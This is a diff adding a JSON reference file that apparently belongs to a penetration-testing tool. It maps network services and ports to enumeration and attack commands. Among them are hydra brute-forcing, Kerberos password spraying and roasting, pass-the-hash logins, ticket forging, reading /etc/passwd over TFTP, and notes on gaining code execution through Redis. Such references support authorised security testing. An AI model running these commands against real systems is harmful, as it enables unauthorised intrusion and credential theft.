@@ -1,0 +1,2547 @@
+{
+  "dns": {
+    "ports": [
+      53
+    ],
+    "protocol": "tcp/udp",
+    "description": "Domain Name System - resolves hostnames to IPs",
+    "context": "both",
+    "category": "network",
+    "tools": [
+      "dig",
+      "nmap",
+      "dnsrecon",
+      "dnsx",
+      "fierce",
+      "subfinder",
+      "amass"
+    ],
+    "commands": [
+      "dig @TARGET version.bind chaos txt",
+      "dig @TARGET axfr DOMAIN",
+      "dnsrecon -d DOMAIN -n TARGET",
+      "nmap --script dns-zone-transfer,dns-recursion,dns-service-discovery -p53 TARGET",
+      "dig any TARGET @TARGET",
+      "nmap --script dns-nsid TARGET",
+      "fierce --domain DOMAIN --dns-servers TARGET",
+      "dnsx -l subdomains.txt -r TARGET -a -aaaa -cname -mx -ns -ptr -soa -txt",
+      "amass enum -d DOMAIN -r TARGET"
+    ],
+    "notes": "Zone transfer (AXFR) is high value. Check for open recursion on external DNS."
+  },
+  "ftp": {
+    "ports": [
+      21
+    ],
+    "protocol": "tcp",
+    "description": "File Transfer Protocol",
+    "context": "both",
+    "category": "file_transfer",
+    "tools": [
+      "nmap",
+      "hydra",
+      "ftp",
+      "lftp"
+    ],
+    "commands": [
+      "nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p21 TARGET",
+      "nmap --script ftp-* -p 21 TARGET",
+      "ftp -n TARGET (then: user anonymous anonymous)",
+      "hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://TARGET",
+      "lftp -u anonymous,anonymous TARGET -e 'ls; exit'"
+    ],
+    "notes": "Always test anonymous login first. Check for writable directories.",
+    "services": [
+      "ftp"
+    ]
+  },
+  "ssh": {
+    "ports": [
+      22
+    ],
+    "protocol": "tcp",
+    "description": "Secure Shell remote access",
+    "context": "both",
+    "category": "remote_access",
+    "tools": [
+      "ssh-audit",
+      "nmap",
+      "hydra",
+      "metasploit"
+    ],
+    "commands": [
+      "ssh-audit TARGET",
+      "nmap --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -p22 TARGET",
+      "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET",
+      "hydra -L users.txt -P passwords.txt ssh://TARGET -t 4"
+    ],
+    "notes": "Check for weak algorithms, deprecated ciphers, and key-based auth. Avoid aggressive brute force.",
+    "services": [
+      "ssh"
+    ]
+  },
+  "telnet": {
+    "ports": [
+      23
+    ],
+    "protocol": "tcp",
+    "description": "Unencrypted remote terminal",
+    "context": "both",
+    "category": "remote_access",
+    "tools": [
+      "nmap",
+      "hydra",
+      "telnet"
+    ],
+    "commands": [
+      "nmap --script telnet-encryption,telnet-ntlm-info -p23 TARGET",
+      "hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://TARGET",
+      "telnet TARGET 23"
+    ],
+    "notes": "Cleartext protocol \u2014 capture credentials if MitM is in scope.",
+    "services": [
+      "telnet"
+    ]
+  },
+  "smtp": {
+    "ports": [
+      25,
+      465,
+      587,
+      2525
+    ],
+    "protocol": "tcp",
+    "description": "Simple Mail Transfer Protocol",
+    "context": "both",
+    "category": "email",
+    "tools": [
+      "nmap",
+      "swaks",
+      "smtp-user-enum",
+      "telnet"
+    ],
+    "commands": [
+      "nmap --script smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay -p25,465,587 TARGET",
+      "nmap --script smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 TARGET",
+      "smtp-user-enum -M VRFY -U users.txt -t TARGET",
+      "smtp-user-enum -M EXPN -U users.txt -t TARGET",
+      "smtp-user-enum -M RCPT -U users.txt -t TARGET -D DOMAIN",
+      "swaks --to test@DOMAIN --from attacker@evil.com --server TARGET",
+      "telnet TARGET 25 (then: EHLO test; VRFY root)"
+    ],
+    "notes": "Test for open relay, user enumeration via VRFY/EXPN/RCPT, and NTLM info disclosure."
+  },
+  "pop3": {
+    "ports": [
+      110,
+      995
+    ],
+    "protocol": "tcp",
+    "description": "Post Office Protocol v3 - email retrieval",
+    "context": "both",
+    "category": "email",
+    "tools": [
+      "nmap",
+      "hydra",
+      "telnet"
+    ],
+    "commands": [
+      "nmap --script pop3-capabilities,pop3-ntlm-info -p110,995 TARGET",
+      "hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://TARGET",
+      "telnet TARGET 110 (then: USER admin; PASS admin)"
+    ],
+    "notes": "Port 995 is POP3S (TLS). Check for plaintext credentials on port 110."
+  },
+  "imap": {
+    "ports": [
+      143,
+      993
+    ],
+    "protocol": "tcp",
+    "description": "Internet Message Access Protocol",
+    "context": "both",
+    "category": "email",
+    "tools": [
+      "nmap",
+      "hydra",
+      "curl"
+    ],
+    "commands": [
+      "nmap --script imap-capabilities,imap-ntlm-info -p143,993 TARGET",
+      "hydra -l user -P /usr/share/wordlists/rockyou.txt imap://TARGET",
+      "curl -v --url 'imap://TARGET' --user 'user:password' --request 'LIST \"\" *'"
+    ],
+    "notes": "Port 993 is IMAPS. Check for plaintext auth on port 143."
+  },
+  "http": {
+    "ports": [
+      80,
+      8000,
+      8080,
+      8888,
+      8008,
+      8443,
+      3000,
+      5000,
+      9000
+    ],
+    "protocol": "tcp",
+    "description": "Hypertext Transfer Protocol - web services",
+    "context": "both",
+    "category": "web",
+    "tools": [
+      "nikto",
+      "nuclei",
+      "ffuf",
+      "gobuster",
+      "feroxbuster",
+      "whatweb",
+      "wappalyzer",
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script http-methods,http-title,http-auth,http-headers,http-server-header -p80,8080,8000 TARGET",
+      "whatweb -a 3 http://TARGET",
+      "dirsearch -u http://TARGET -e php,html,txt -t 20",
+      "nikto -h http://TARGET -output nikto_TARGET.txt",
+      "nuclei -u http://TARGET -t /root/nuclei-templates/ -o nuclei_TARGET.txt",
+      "ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -o ffuf_TARGET.json -of json",
+      "gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -o gobuster_TARGET.txt",
+      "feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt",
+      "curl -s -I http://TARGET",
+      "curl -s -X OPTIONS http://TARGET -D -"
+    ],
+    "notes": "Check HTTP methods, headers (security headers missing), virtual hosts, and default credentials.",
+    "services": [
+      "http-alt",
+      "http-proxy",
+      "https",
+      "squid-http"
+    ]
+  },
+  "https": {
+    "ports": [
+      443,
+      8443,
+      4443
+    ],
+    "protocol": "tcp",
+    "description": "HTTP over TLS/SSL",
+    "context": "both",
+    "category": "web",
+    "tools": [
+      "sslscan",
+      "testssl.sh",
+      "nuclei",
+      "nikto",
+      "sslyze",
+      "nmap"
+    ],
+    "commands": [
+      "sslscan TARGET:443",
+      "testssl.sh TARGET",
+      "sslyze --regular TARGET",
+      "nmap --script ssl-enum-ciphers,ssl-cert,ssl-heartbleed,ssl-poodle,ssl-dh-params -p443 TARGET",
+      "nikto -h https://TARGET -output nikto_https_TARGET.txt",
+      "nuclei -u https://TARGET -t /root/nuclei-templates/ -o nuclei_https_TARGET.txt"
+    ],
+    "notes": "Check for weak ciphers, expired/self-signed certs, Heartbleed, POODLE, BEAST, and HSTS missing."
+  },
+  "netbios_ns": {
+    "ports": [
+      137
+    ],
+    "protocol": "udp",
+    "services": [
+      "netbios-ns",
+      "netbios_ns"
+    ],
+    "description": "NetBIOS Name Service",
+    "context": "internal",
+    "category": "windows",
+    "tools": [
+      "nbtscan",
+      "nmap"
+    ],
+    "commands": [
+      "nbtscan TARGET",
+      "nbtscan -r TARGET/24",
+      "nmap --script nbstat -p137 TARGET"
+    ],
+    "notes": "Maps NetBIOS names to IPs. Useful for internal Windows host discovery."
+  },
+  "netbios_ssn": {
+    "ports": [
+      139
+    ],
+    "protocol": "tcp",
+    "services": [
+      "netbios-ssn",
+      "netbios_ssn"
+    ],
+    "description": "NetBIOS Session Service (legacy SMB)",
+    "context": "internal",
+    "category": "windows",
+    "tools": [
+      "nmap",
+      "enum4linux"
+    ],
+    "commands": [
+      "nmap --script nbstat,smb-os-discovery -p139 TARGET",
+      "enum4linux -a TARGET"
+    ],
+    "notes": "Legacy SMB over NetBIOS. Usually paired with port 445."
+  },
+  "smb": {
+    "ports": [
+      445,
+      139
+    ],
+    "protocol": "tcp",
+    "description": "Server Message Block - Windows file/printer sharing",
+    "context": "internal",
+    "category": "windows",
+    "tools": [
+      "enum4linux",
+      "enum4linux-ng",
+      "crackmapexec",
+      "smbmap",
+      "smbclient",
+      "nmap",
+      "impacket"
+    ],
+    "commands": [
+      "nmap --script smb-os-discovery,smb-security-mode,smb-enum-shares,smb-enum-users,smb-vuln-ms17-010,smb-vuln-ms08-067,smb2-security-mode -p445,139 TARGET",
+      "enum4linux -a TARGET",
+      "enum4linux-ng -A TARGET -oY enum4linux_TARGET",
+      "crackmapexec smb TARGET",
+      "crackmapexec smb TARGET --shares",
+      "crackmapexec smb TARGET --users",
+      "crackmapexec smb TARGET --groups",
+      "crackmapexec smb TARGET --pass-pol",
+      "crackmapexec smb TARGET --rid-brute",
+      "crackmapexec smb TARGET --sessions",
+      "crackmapexec smb TARGET --loggedon-users",
+      "crackmapexec smb TARGET --disks",
+      "crackmapexec smb TARGET --local-groups",
+      "nmap --script smb-vuln* -Pn -p 139,445 TARGET",
+      "nmap --script smb-brute -p 445 TARGET",
+      "smbmap -H TARGET",
+      "smbmap -H TARGET -u 'anonymous'",
+      "smbclient -L //TARGET -N",
+      "smbclient //TARGET/SHARE -N",
+      "impacket-smbclient TARGET",
+      "crackmapexec smb SUBNET/24 --gen-relay-list relay_targets.txt"
+    ],
+    "notes": "Check for null sessions, guest access, EternalBlue (MS17-010), and SMB signing disabled.",
+    "services": [
+      "microsoft-ds",
+      "netbios-ssn"
+    ]
+  },
+  "msrpc": {
+    "ports": [
+      135
+    ],
+    "protocol": "tcp",
+    "description": "Microsoft RPC Endpoint Mapper",
+    "context": "internal",
+    "category": "windows",
+    "tools": [
+      "nmap",
+      "impacket",
+      "rpcclient"
+    ],
+    "commands": [
+      "nmap --script msrpc-enum -p135 TARGET",
+      "rpcclient -U '' -N TARGET",
+      "rpcclient -U '' -N TARGET -c 'enumdomusers'",
+      "rpcclient -U '' -N TARGET -c 'enumdomgroups'",
+      "rpcclient -U '' -N TARGET -c 'querydominfo'",
+      "rpcclient -U '' -N TARGET -c 'netshareenumall'",
+      "impacket-rpcdump @TARGET",
+      "impacket-samrdump TARGET"
+    ],
+    "notes": "Null session on RPC can expose domain users, groups, and policy. Map RPC services with rpcdump."
+  },
+  "ldap": {
+    "ports": [
+      389
+    ],
+    "protocol": "tcp",
+    "description": "Lightweight Directory Access Protocol",
+    "context": "internal",
+    "category": "directory",
+    "tools": [
+      "ldapsearch",
+      "windapsearch",
+      "nmap",
+      "ldapdomaindump"
+    ],
+    "commands": [
+      "nmap --script ldap-rootdse,ldap-search -p389 TARGET",
+      "nmap -n -sV --script \"ldap* and not brute\" -p 389 TARGET",
+      "ldapsearch -x -H ldap://TARGET -s base",
+      "ldapsearch -x -H ldap://TARGET -b '' -s base '(objectclass=*)' namingContexts",
+      "ldapsearch -x -H ldap://TARGET -b 'dc=DOMAIN,dc=local'",
+      "ldapsearch -x -H ldap://TARGET -b 'dc=DOMAIN,dc=local' '(objectClass=person)' sAMAccountName",
+      "windapsearch -d DOMAIN -u '' --dc-ip TARGET --users",
+      "windapsearch -d DOMAIN -u '' --dc-ip TARGET --groups",
+      "windapsearch -d DOMAIN -u '' --dc-ip TARGET --computers",
+      "ldapdomaindump -u 'DOMAIN\\user' -p 'password' TARGET",
+      "ldapsearch -H ldap://TARGET -x -s base -b '' \"(objectClass=*)\" \"*\" +"
+    ],
+    "notes": "Try anonymous/unauthenticated bind first. Dump AD objects with ldapdomaindump.",
+    "services": [
+      "ldap"
+    ]
+  },
+  "ldaps": {
+    "ports": [
+      636,
+      3269
+    ],
+    "protocol": "tcp",
+    "description": "LDAP over SSL/TLS",
+    "context": "internal",
+    "category": "directory",
+    "tools": [
+      "ldapsearch",
+      "nmap",
+      "windapsearch"
+    ],
+    "commands": [
+      "nmap --script ldap-rootdse -p636 TARGET",
+      "ldapsearch -x -H ldaps://TARGET -s base",
+      "ldapsearch -x -H ldaps://TARGET -b 'dc=DOMAIN,dc=local' -D 'user@DOMAIN' -w 'password'"
+    ],
+    "notes": "Port 3269 is Global Catalog over SSL. Check certificate validity."
+  },
+  "kerberos": {
+    "ports": [
+      88
+    ],
+    "protocol": "tcp/udp",
+    "description": "Kerberos authentication service",
+    "context": "internal",
+    "category": "directory",
+    "tools": [
+      "kerbrute",
+      "impacket",
+      "nmap",
+      "rubeus"
+    ],
+    "commands": [
+      "nmap --script krb5-enum-users -p88 TARGET",
+      "nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=DOMAIN,userdb=users.txt TARGET",
+      "kerbrute userenum users.txt --dc TARGET -d DOMAIN",
+      "kerbrute passwordspray users.txt 'Password1!' --dc TARGET -d DOMAIN",
+      "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip TARGET -outputfile asrep_hashes.txt",
+      "impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip TARGET -outputfile kerberoast_hashes.txt",
+      "impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip TARGET -request",
+      "impacket-ticketer -nthash HASH -domain-sid S-1-5-21-... -domain DOMAIN -spn cifs/TARGET Administrator"
+    ],
+    "notes": "AS-REP Roasting (no preauth required users), Kerberoasting (SPNs), and user enumeration via Kerberos."
+  },
+  "rdp": {
+    "ports": [
+      3389
+    ],
+    "protocol": "tcp",
+    "description": "Remote Desktop Protocol",
+    "context": "both",
+    "category": "remote_access",
+    "tools": [
+      "nmap",
+      "hydra",
+      "crowbar",
+      "xfreerdp"
+    ],
+    "commands": [
+      "nmap --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info -p3389 TARGET",
+      "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET",
+      "crowbar -b rdp -s TARGET/32 -u administrator -C passwords.txt",
+      "xfreerdp /v:TARGET /u:administrator /p:'Password1' /cert-ignore"
+    ],
+    "notes": "Check for BlueKeep (CVE-2019-0708), NLA disabled, and weak credentials.",
+    "services": [
+      "ms-wbt-server"
+    ]
+  },
+  "winrm": {
+    "ports": [
+      5985,
+      5986
+    ],
+    "protocol": "tcp",
+    "description": "Windows Remote Management (WS-Management)",
+    "context": "internal",
+    "category": "windows",
+    "tools": [
+      "crackmapexec",
+      "evil-winrm",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script http-auth-finder -p5985,5986 TARGET",
+      "crackmapexec winrm TARGET",
+      "crackmapexec winrm TARGET -u users.txt -p passwords.txt",
+      "evil-winrm -i TARGET -u administrator -p 'Password1!'",
+      "evil-winrm -i TARGET -u administrator -H NTHASH"
+    ],
+    "notes": "Port 5986 is HTTPS (WinRM over TLS). Evil-WinRM supports pass-the-hash."
+  },
+  "wmi": {
+    "ports": [
+      135,
+      49152
+    ],
+    "protocol": "tcp",
+    "description": "Windows Management Instrumentation",
+    "context": "internal",
+    "category": "windows",
+    "tools": [
+      "crackmapexec",
+      "impacket",
+      "nmap"
+    ],
+    "commands": [
+      "crackmapexec wmi TARGET",
+      "crackmapexec wmi TARGET -u user -p 'password'",
+      "impacket-wmiexec DOMAIN/USER:PASS@TARGET",
+      "impacket-wmiexec DOMAIN/USER@TARGET -hashes :NTHASH"
+    ],
+    "notes": "WMI uses dynamic high ports after initial connection to 135. Useful for lateral movement."
+  },
+  "snmp": {
+    "ports": [
+      161,
+      162
+    ],
+    "protocol": "udp",
+    "description": "Simple Network Management Protocol",
+    "context": "both",
+    "category": "network",
+    "tools": [
+      "snmpwalk",
+      "onesixtyone",
+      "snmp-check",
+      "braa",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script snmp-info,snmp-interfaces,snmp-sysdescr,snmp-win32-users,snmp-brute -sU -p161 TARGET",
+      "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET",
+      "snmpwalk -v1 -c public TARGET",
+      "snmpwalk -v2c -c public TARGET",
+      "snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2",
+      "snmp-check TARGET -c public",
+      "braa public@TARGET:.1.3.6.*",
+      "nmap --script \"snmp* and not snmp-brute\" TARGET"
+    ],
+    "notes": "Community strings 'public' and 'private' are common defaults. SNMPv3 has auth. Check for system info, routing tables, and user lists."
+  },
+  "ntp": {
+    "ports": [
+      123
+    ],
+    "protocol": "udp",
+    "description": "Network Time Protocol",
+    "context": "both",
+    "category": "network",
+    "tools": [
+      "nmap",
+      "ntpq"
+    ],
+    "commands": [
+      "nmap --script ntp-info,ntp-monlist -sU -p123 TARGET",
+      "ntpq -p TARGET",
+      "ntpdc -n -c monlist TARGET"
+    ],
+    "notes": "NTP monlist can amplify DDoS and leak peer IPs. Check for misconfigured NTP servers."
+  },
+  "tftp": {
+    "ports": [
+      69
+    ],
+    "protocol": "udp",
+    "description": "Trivial File Transfer Protocol",
+    "context": "both",
+    "category": "file_transfer",
+    "tools": [
+      "nmap",
+      "tftp"
+    ],
+    "commands": [
+      "nmap --script tftp-enum -sU -p69 TARGET",
+      "tftp TARGET (then: get /etc/passwd)"
+    ],
+    "notes": "No authentication. Used by network devices for config/firmware. Try to fetch common config files."
+  },
+  "finger": {
+    "ports": [
+      79
+    ],
+    "protocol": "tcp",
+    "description": "Finger protocol - user information lookup",
+    "context": "both",
+    "category": "information_disclosure",
+    "tools": [
+      "nmap",
+      "finger"
+    ],
+    "commands": [
+      "nmap --script finger -p79 TARGET",
+      "finger @TARGET",
+      "finger root@TARGET",
+      "finger 0@TARGET"
+    ],
+    "notes": "Legacy protocol that can disclose logged-in users and account information."
+  },
+  "mssql": {
+    "ports": [
+      1433,
+      1434
+    ],
+    "protocol": "tcp/udp",
+    "description": "Microsoft SQL Server",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "crackmapexec",
+      "nmap",
+      "impacket",
+      "mssqlclient",
+      "sqsh"
+    ],
+    "commands": [
+      "nmap --script ms-sql-info,ms-sql-config,ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-xp-cmdshell -p1433 TARGET",
+      "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password= -sV -p 1433 TARGET",
+      "nmap --script ms-sql-info -sU -p1434 TARGET",
+      "crackmapexec mssql TARGET",
+      "crackmapexec mssql TARGET -u sa -p '' --local-auth",
+      "crackmapexec mssql TARGET -u users.txt -p passwords.txt",
+      "nxc mssql TARGET -u sa -p '' --rid-brute 10000",
+      "impacket-mssqlclient DOMAIN/USER:PASS@TARGET",
+      "impacket-mssqlclient sa:''@TARGET -windows-auth",
+      "sqsh -S TARGET -U sa -P '' -D master"
+    ],
+    "notes": "Check for sa blank password, xp_cmdshell enabled, and linked servers. UDP 1434 = SQL Browser service.",
+    "services": [
+      "ms-sql-s"
+    ]
+  },
+  "mysql": {
+    "ports": [
+      3306
+    ],
+    "protocol": "tcp",
+    "description": "MySQL / MariaDB database",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "nmap",
+      "mysql",
+      "hydra"
+    ],
+    "commands": [
+      "nmap --script mysql-info,mysql-databases,mysql-users,mysql-empty-password,mysql-vuln-cve2012-2122 -p3306 TARGET",
+      "nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 TARGET",
+      "mysql -h TARGET -u root --password=''",
+      "mysql -h TARGET -u root -e 'SELECT version();'",
+      "mysql -h TARGET -u root -p -e 'show databases;'",
+      "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET"
+    ],
+    "notes": "Check for root with blank password, anonymous access, and privilege escalation via FILE privilege.",
+    "services": [
+      "mysql"
+    ]
+  },
+  "postgres": {
+    "ports": [
+      5432
+    ],
+    "protocol": "tcp",
+    "description": "PostgreSQL database",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "nmap",
+      "psql",
+      "hydra"
+    ],
+    "commands": [
+      "nmap --script pgsql-brute,pgsql-databases -p5432 TARGET",
+      "psql -h TARGET -U postgres -W",
+      "psql -h TARGET -U postgres -c '\\l'",
+      "hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://TARGET"
+    ],
+    "notes": "Default user is 'postgres'. Check for COPY TO/FROM PROGRAM for code execution."
+  },
+  "oracle": {
+    "ports": [
+      1521,
+      1522,
+      1748
+    ],
+    "protocol": "tcp",
+    "description": "Oracle Database",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "nmap",
+      "odat",
+      "oscanner",
+      "sqlplus"
+    ],
+    "commands": [
+      "nmap --script oracle-sid-brute,oracle-brute,oracle-enum-users -p1521 TARGET",
+      "odat all -s TARGET -p 1521",
+      "odat sidguesser -s TARGET -p 1521",
+      "odat passwordguesser -s TARGET -p 1521 -d SID",
+      "oscanner -s TARGET -P 1521",
+      "sqlplus user/password@TARGET:1521/SID"
+    ],
+    "notes": "Enumerate SIDs first (oracle-sid-brute). Default SIDs: XE, ORCL, ORACLE, PROD."
+  },
+  "mongodb": {
+    "ports": [
+      27017,
+      27018,
+      27019
+    ],
+    "protocol": "tcp",
+    "description": "MongoDB NoSQL database",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "nmap",
+      "mongo",
+      "mongosh"
+    ],
+    "commands": [
+      "nmap --script mongodb-info,mongodb-databases -p27017 TARGET",
+      "mongosh --host TARGET --port 27017",
+      "mongosh --host TARGET --port 27017 --eval 'db.adminCommand({listDatabases: 1})'",
+      "mongosh --host TARGET --port 27017 --eval 'db.getUsers()'"
+    ],
+    "notes": "Older MongoDB versions have no auth by default. List all databases and collections."
+  },
+  "redis": {
+    "ports": [
+      6379
+    ],
+    "protocol": "tcp",
+    "description": "Redis in-memory data store",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "redis-cli",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script redis-info -p6379 TARGET",
+      "redis-cli -h TARGET INFO",
+      "redis-cli -h TARGET CONFIG GET *",
+      "redis-cli -h TARGET KEYS '*'",
+      "redis-cli -h TARGET -a 'password' INFO",
+      "redis-cli -h TARGET CONFIG GET dir",
+      "redis-cli -h TARGET CONFIG GET dbfilename"
+    ],
+    "notes": "Unauthenticated Redis can allow RCE via CONFIG SET (writing cron, SSH keys, or webshells)."
+  },
+  "elasticsearch": {
+    "ports": [
+      9200,
+      9300
+    ],
+    "protocol": "tcp",
+    "description": "Elasticsearch search and analytics engine",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:9200/",
+      "curl -s http://TARGET:9200/_cluster/health",
+      "curl -s http://TARGET:9200/_cat/indices?v",
+      "curl -s http://TARGET:9200/_cat/nodes?v",
+      "curl -s http://TARGET:9200/_cat/shards?v",
+      "curl -s http://TARGET:9200/_nodes",
+      "curl -s 'http://TARGET:9200/_search?q=*&size=10'"
+    ],
+    "notes": "Unauthenticated clusters can expose all data. Port 9300 is transport layer."
+  },
+  "cassandra": {
+    "ports": [
+      9042,
+      9160
+    ],
+    "protocol": "tcp",
+    "description": "Apache Cassandra distributed database",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "cqlsh",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script cassandra-info -p9042 TARGET",
+      "cqlsh TARGET",
+      "cqlsh TARGET -e 'DESCRIBE KEYSPACES;'",
+      "cqlsh TARGET -e 'SELECT * FROM system_auth.roles;'"
+    ],
+    "notes": "Port 9160 is Thrift API (deprecated). Check for no-auth and accessible keyspaces."
+  },
+  "couchdb": {
+    "ports": [
+      5984
+    ],
+    "protocol": "tcp",
+    "description": "Apache CouchDB document database",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:5984/",
+      "curl -s http://TARGET:5984/_all_dbs",
+      "curl -s http://TARGET:5984/_utils/",
+      "curl -s http://TARGET:5984/_config"
+    ],
+    "notes": "Admin Party mode gives unauthenticated admin access. CVE-2017-12635 for privilege escalation."
+  },
+  "memcached": {
+    "ports": [
+      11211
+    ],
+    "protocol": "tcp/udp",
+    "description": "Memcached distributed memory caching",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "nmap",
+      "nc",
+      "memcdump"
+    ],
+    "commands": [
+      "nmap --script memcached-info -p11211 TARGET",
+      "nc TARGET 11211 (then: stats; stats items; stats cachedump SLABID LIMIT)",
+      "memcdump --servers=TARGET",
+      "echo 'stats' | nc TARGET 11211"
+    ],
+    "notes": "No authentication. Can expose session data, credentials, or application secrets."
+  },
+  "neo4j": {
+    "ports": [
+      7474,
+      7687
+    ],
+    "protocol": "tcp",
+    "description": "Neo4j graph database",
+    "context": "both",
+    "category": "database",
+    "tools": [
+      "curl",
+      "cypher-shell"
+    ],
+    "commands": [
+      "curl -s http://TARGET:7474/",
+      "curl -s http://TARGET:7474/db/data/",
+      "cypher-shell -a bolt://TARGET:7687 -u neo4j -p neo4j 'MATCH (n) RETURN n LIMIT 10'"
+    ],
+    "notes": "Default creds: neo4j/neo4j. HTTP API on 7474, Bolt protocol on 7687."
+  },
+  "nfs": {
+    "ports": [
+      111,
+      2049,
+      32768
+    ],
+    "protocol": "tcp/udp",
+    "description": "Network File System",
+    "context": "internal",
+    "category": "file_transfer",
+    "tools": [
+      "showmount",
+      "nmap",
+      "mount"
+    ],
+    "commands": [
+      "nmap --script nfs-ls,nfs-showmount,nfs-statfs -p111,2049 TARGET",
+      "showmount -e TARGET",
+      "showmount -a TARGET",
+      "mount -t nfs TARGET:/share /mnt/nfs -o nolock",
+      "rpcinfo -p TARGET"
+    ],
+    "notes": "Check for no_root_squash on exports. Can escalate via UID=0 file creation.",
+    "services": [
+      "nfs",
+      "nfs_acl",
+      "rpcbind",
+      "nlockmgr",
+      "rpcinfo"
+    ]
+  },
+  "rsync": {
+    "ports": [
+      873
+    ],
+    "protocol": "tcp",
+    "description": "rsync file synchronization",
+    "context": "both",
+    "category": "file_transfer",
+    "tools": [
+      "rsync",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script rsync-list-modules -p873 TARGET",
+      "rsync TARGET::",
+      "rsync rsync://TARGET/",
+      "rsync rsync://TARGET/MODULE/ --list-only",
+      "rsync -av rsync://TARGET/MODULE /tmp/rsync_dump/"
+    ],
+    "notes": "Anonymous rsync can expose files or allow upload. Can overwrite SSH authorized_keys."
+  },
+  "vnc": {
+    "ports": [
+      5900,
+      5901,
+      5902
+    ],
+    "protocol": "tcp",
+    "description": "Virtual Network Computing remote desktop",
+    "context": "both",
+    "category": "remote_access",
+    "tools": [
+      "nmap",
+      "hydra",
+      "vncviewer"
+    ],
+    "commands": [
+      "nmap --script vnc-info,vnc-brute,realvnc-auth-bypass -p5900-5902 TARGET",
+      "hydra -P /usr/share/wordlists/rockyou.txt vnc://TARGET",
+      "vncviewer TARGET:5900"
+    ],
+    "notes": "Check for authentication bypass (CVE-2006-2369 realvnc), null auth, and weak passwords.",
+    "services": [
+      "vnc"
+    ]
+  },
+  "x11": {
+    "ports": [
+      6000,
+      6001,
+      6002
+    ],
+    "protocol": "tcp",
+    "description": "X Window System",
+    "context": "internal",
+    "category": "remote_access",
+    "tools": [
+      "nmap",
+      "xspy",
+      "xwd"
+    ],
+    "commands": [
+      "nmap --script x11-access -p6000-6005 TARGET",
+      "xspy -display TARGET:0",
+      "xwd -root -display TARGET:0 -out /tmp/screenshot.xwd"
+    ],
+    "notes": "Unauthenticated X11 allows screen capture and keystroke logging."
+  },
+  "cups": {
+    "ports": [
+      631
+    ],
+    "protocol": "tcp",
+    "description": "Common UNIX Printing System",
+    "context": "internal",
+    "category": "service",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script cups-info,cups-queue-info -p631 TARGET",
+      "curl -s http://TARGET:631/",
+      "curl -s http://TARGET:631/printers/"
+    ],
+    "notes": "CUPS 2.x CVE-2024-47176 (unauthenticated RCE). Enumerate printers and admin access."
+  },
+  "ipmi": {
+    "ports": [
+      623
+    ],
+    "protocol": "udp",
+    "description": "Intelligent Platform Management Interface",
+    "context": "internal",
+    "category": "management",
+    "tools": [
+      "nmap",
+      "ipmitool",
+      "metasploit"
+    ],
+    "commands": [
+      "nmap --script ipmi-version,ipmi-brute -sU -p623 TARGET",
+      "ipmitool -I lanplus -H TARGET -U admin -P admin chassis status",
+      "ipmitool -I lanplus -H TARGET -U '' -P '' cipher 0 chassis status"
+    ],
+    "notes": "Cipher 0 auth bypass (CVE-2013-4786) leaks password hashes. IPMI 2.0 RAKP hash disclosure is critical."
+  },
+  "sip": {
+    "ports": [
+      5060,
+      5061
+    ],
+    "protocol": "tcp/udp",
+    "description": "Session Initiation Protocol (VoIP)",
+    "context": "both",
+    "category": "voip",
+    "tools": [
+      "nmap",
+      "sipvicious",
+      "svmap"
+    ],
+    "commands": [
+      "nmap --script sip-methods,sip-enum-users -sU -p5060 TARGET",
+      "svmap TARGET",
+      "svwar -e100-200 TARGET",
+      "svcrack -u100 TARGET"
+    ],
